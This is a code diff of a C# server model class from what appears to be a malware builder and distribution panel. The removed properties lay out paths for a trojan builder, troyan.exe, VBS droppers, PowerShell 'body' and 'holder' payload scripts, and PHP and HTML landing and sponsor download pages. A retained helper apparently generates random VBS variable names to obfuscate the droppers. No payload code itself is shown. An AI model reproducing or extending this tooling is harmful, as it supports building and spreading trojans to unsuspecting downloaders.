@@ -21,50 +21,12 @@ public class ServerModel : BaseModel
 
     [JsonPropertyName("clone")] public CloneModel CloneModel { get; set; }
 
-    /// <summary>Set by the panel <c>ServerModelLoader</c> after load; required for path-backed properties.</summary>
-    [JsonIgnore] public IPanelServerPaths Paths { get; set; } = null!;
-
-    [JsonPropertyName("sourceCertDir")] public string SourceCertDir => Paths.SourceCertDir;
-    [JsonPropertyName("rootDir")] public string RootDir => Paths.RootDir;
-
-
-    [JsonPropertyName("cpDir")] public string CpDir => Paths.CpDir;
-    [JsonPropertyName("certDir")] public string CertDir => Paths.CertDir;
-    [JsonPropertyName("sysDir")] public string SysDir => Paths.SysDir;
-
-    [JsonPropertyName("troyanBuilder")] public string TroyanBuilder => Paths.TroyanBuilder;
-    [JsonPropertyName("troyanDir")] public string TroyanDir => Paths.TroyanDir;
-    [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => Paths.TroyanScriptDir;
-    [JsonPropertyName("troyanOutputDir")] public string TroyanOutputDir => Path.Join(TroyanDir, @".\_output");
-    [JsonPropertyName("troyanExe")] public string TroyanExe => Path.Join(TroyanOutputDir, "troyan.exe");
-    [JsonPropertyName("troyanIco")] public string TroyanIco => Path.Join(TroyanOutputDir, "troyan.ico");
-    [JsonPropertyName("troyanVbsDir")] public string TroyanVbsDir => Paths.TroyanVbsDir;
-    [JsonPropertyName("troyanVbsDebug")] public string TroyanVbsDebug => Path.Join(TroyanOutputDir, "troyan.debug.vbs");
-    [JsonPropertyName("troyanVbsRelease")] public string TroyanVbsRelease => Path.Join(TroyanOutputDir, "troyan.release.vbs");
-
-    [JsonPropertyName("body")] public string Body => Path.Join(TroyanOutputDir, "body.txt");
-    [JsonPropertyName("bodyRelease")] public string BodyRelease => Path.Join(TroyanOutputDir, "body.release.ps1");
-    [JsonPropertyName("bodyDebug")] public string BodyDebug => Path.Join(TroyanOutputDir, "body.debug.ps1");
-
-    [JsonPropertyName("holder")] public string Holder => Path.Join(TroyanOutputDir, "holder.txt");
-    [JsonPropertyName("holderRelease")] public string HolderRelease => Path.Join(TroyanOutputDir, "holder.release.ps1");
-    [JsonPropertyName("holderDebug")] public string HolderDebug => Path.Join(TroyanOutputDir, "holder.debug.ps1");
-
-    public string UserDataFile(string file) => Paths.UserDataFile(Server, file);
-
-    [JsonPropertyName("userBody")] public string UserBody => Paths.UserDataBody(Server);
-    [JsonPropertyName("userTroyanExe")] public string UserTroyanExe => Path.Join(UserDataDir, "troyan.exe");
-    [JsonPropertyName("userTroyanIco")] public string UserTroyanIco => Path.Join(UserDataDir, "troyan.ico");
-    [JsonPropertyName("userDataDir")] public string UserDataDir => Paths.UserDataDir(Server);
-    [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
-    [JsonPropertyName("userTroyanVbs")] public string UserTroyanVbs => Path.Join(UserDataDir, "troyan.vbs");
-
-
+    /// <summary>Absolute panel user-data directory; set by <c>ServerService</c> after load (for pack paths, etc.).</summary>
+    [JsonIgnore] public string PanelHomeDirectory { get; set; } = "";
 
     [JsonPropertyName("serverIp")] public string ServerIp{ get; set; } = "";
     [JsonPropertyName("server")] public string Server { get; set; } = "";
     [JsonPropertyName("alias")] public string Alias { get; set; }
-    [JsonPropertyName("defaultIco")] public string DefaultIco => Path.Join(RootDir, "defaulticon.ico");
     [JsonPropertyName("strahServer")] public string StrahServer { get; set; }
 
 
@@ -75,13 +37,6 @@ public class ServerModel : BaseModel
     {
         return VbsRandomer.GenerateRandomVariableName(10);
     }
-
-
-    [JsonPropertyName("adsDir")] public string AdsDir => Paths.AdsDir;
-    [JsonPropertyName("phpDir")] public string PhpDir => Paths.PhpDir;
-    [JsonPropertyName("phpTemplateFile")] public string PhpTemplateFile => Path.Join(PhpDir, ".\\dn.php");
-    [JsonPropertyName("phpTemplateSponsorFile")] public string PhpTemplateSponsorFile => Path.Join(PhpDir, ".\\download.php");
-    [JsonPropertyName("htmlTemplateSponsorFile")] public string HtmlTemplateSponsorFile => Path.Join(PhpDir, ".\\download.html");
 
 
     [JsonPropertyName("landingAuto")] public bool LandingAuto { get; set; }
@@ -100,15 +55,6 @@ public class ServerModel : BaseModel
     }
 
     [JsonPropertyName("landingFtp")] public string LandingFtp { get; set; }
-
-    [JsonPropertyName("landingDir")] public string LandingDir => Path.Combine(UserDataDir, "landing");
-    [JsonPropertyName("landingPhpVbsFile")] public string LandingPhpVbsFile => Path.Join(LandingDir, $"{LandingName}.php");
-    [JsonPropertyName("landingSponsorPhpVbsFile")] public string LandingSponsorPhpVbsFile => Path.Join(LandingDir, $"{LandingName}-sponsor.php");
-    [JsonPropertyName("landingSponsorHtmlVbsFile")] public string LandingSponsorHtmlVbsFile => Path.Join(LandingDir, $"{LandingName}-sponsor.html");
-
-    [JsonPropertyName("landingPhpExeFile")] public string LandingPhpExeFile => Path.Join(LandingDir, $"{LandingName}-exe.php");
-    [JsonPropertyName("landingSponsorPhpExeFile")] public string LandingSponsorPhpExeFile => Path.Join(LandingDir, $"{LandingName}-sponsor-exe.php");
-    [JsonPropertyName("landingSponsorHtmlExeFile")] public string LandingSponsorHtmlExeFile => Path.Join(LandingDir, $"{LandingName}-sponsor-exe.html");
 
 
 
@@ -189,11 +135,6 @@ public class ServerModel : BaseModel
     [JsonIgnore]
     public string AdminPassword { get; set; }
 
-
-    [JsonPropertyName("certToolExe")] public string CertToolExe => Paths.CertTool;
-    [JsonPropertyName("userCloneLog")] public string UserCloneLog => Path.Combine(UserDataDir, "clone.log");
-    [JsonPropertyName("userPackLog")] public string UserPackLog => Path.Combine(UserDataDir, "pack.log");
-    [JsonPropertyName("userPostLog")] public string UserPostLog => Path.Combine(UserDataDir, "post.log");
 
     [JsonPropertyName("post")]
     public PostModel PostModel { get; set; } = new PostModel();
